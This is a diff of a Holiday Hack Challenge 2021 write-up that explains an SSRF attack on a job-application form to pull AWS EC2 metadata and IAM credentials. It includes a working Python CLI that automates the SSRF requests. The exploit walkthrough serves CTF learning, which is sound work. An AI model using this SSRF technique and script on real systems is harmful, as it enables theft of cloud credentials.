@@ -1,6 +1,4 @@
-# pugpug's 2021 Holiday Hack writeup
-
-## Objective Solution
+# Solution
 
 ![Objective 10 description](img/hhc-2021-01.png)
 
@@ -12,7 +10,7 @@ to obtain EC2 metadata. As we don't have direct access to the EC2 instance the j
 application server is running on, there is likely an SSRF vulnerability on the website
 where the web server will perform the request for us and return the data.
 
-### Initial recon
+## Initial recon
 
 Visiting the [job application page](https://apply.jackfrosttower.com/) gives us a simple
 job application site:
@@ -31,7 +29,7 @@ Background Investigation (NLBI)** report.
 If the web server uses the URL in the web form to request data, it may be possible
 to abuse this field to request data that normally isn't available. 
 
-### Exploiting the SSRF vulnerability
+## Exploiting the SSRF vulnerability
 
 By using the 
 techniques from the IMDS terminal and the data from the page referenced in the hint,
@@ -62,16 +60,21 @@ file actually contains the data we requested from the internal AWS metadata serv
 
 ![AWS metadata](img/hhc-2021-07.png)
 
-### Automating the SSRF
+## Automating the SSRF
 
 The objective can be easily completed with just a browser and curl, but as I'm 
 diving deeper into the application than just the objective, I wrote a quick Python
 script to provide a CLI for requesting URLs from the service. It's based on a
 template I developed after reading [0xdf](https://twitter.com/0xdf_)'s
 [blog](https://0xdf.gitlab.io/), specifically his use of Python's `Cmd` module
-to generate an easy to use CLI:
+to generate an easy to use CLI.
 
-``` python linenums="1"
+(seriously, go follow `0xdf_` on twitter and read his blog, it's awesome)
+
+We start with Python boilerplate, defining the payload necessary to fill the web
+form to trigger the SSRF:
+
+``` python
 #!/usr/bin/env python3
 
 import argparse
@@ -94,7 +97,13 @@ payload = {
     'additionalInformation': '',
     'submit': ''
 }
+```
 
+The `fetch()` function submits the data to the web form, sending the passed
+argument as the `inputWorkSample` field. It then requests the image file 
+containing the data from the triggered SSRF, returning the request data.
+
+``` python
 # Send two requests to the web server: the application submission, then
 # request the 'image', returning whatever we pull back.
 #
@@ -105,7 +114,14 @@ def fetch(args):
     r = requests.get(parser.url, params = payload)
     r = requests.get(parser.url + f'images/{name}.jpg')
     return r.text
+```
 
+The heart of the program uses the [`Cmd`](https://docs.python.org/3/library/cmd.html)
+module to generate a command-line interface. After some boilerplate code to set up
+the class, the `default` function calls `fetch()` with what was entered on the 
+command line, printing the result to the screen.
+
+``` python
 # The CLI module
 class Term(cmd.Cmd):
     # Boilerplate to make the CLI more friendly.
@@ -123,11 +139,19 @@ class Term(cmd.Cmd):
     # the web server, and print the result.
     def default(self, args):
         print(fetch(args))
+```
 
-# Main program. We define two arguments:
+The main program accepts two optional arguments: `--url` allows one to specify
+a different URL to interact with, while `--file` specifies a single URL to request,
+without running the CLI. This is useful for saving larger requested URLs without
+copy/pasting.
+
+``` python
+# Main program. The code accepts two arguments:
 #
 # --file: retrieve a single URL/file and print it. Useful for one-shot
-#         file retrieval and storage (e.g. ssrf.py --file https://google.com > google)
+#         file retrieval and storage 
+#         (e.g. ssrf.py --file https://google.com > google)
 #
 # --url: the top-leve URL to send requests to. Will come in handy if we're
 #        able to duplicate the website functionality locally
@@ -148,11 +172,10 @@ if __name__ == "__main__":
         term.cmdloop()
 ```
 
-(seriously, go follow `0xdf_` on twitter and read his blog, it's awesome)
+## Retrieving the objective data
 
-### Retrieving the objective data
-
-With this script, we can easily request the current security credentials from 
+With this script, we can easily request the current role associated with the instance
+by querying 
 `http://169.254.169.254/latest/meta-data/iam/security-credentials`, then use the
 `role` returned to fetch the access keys:
 
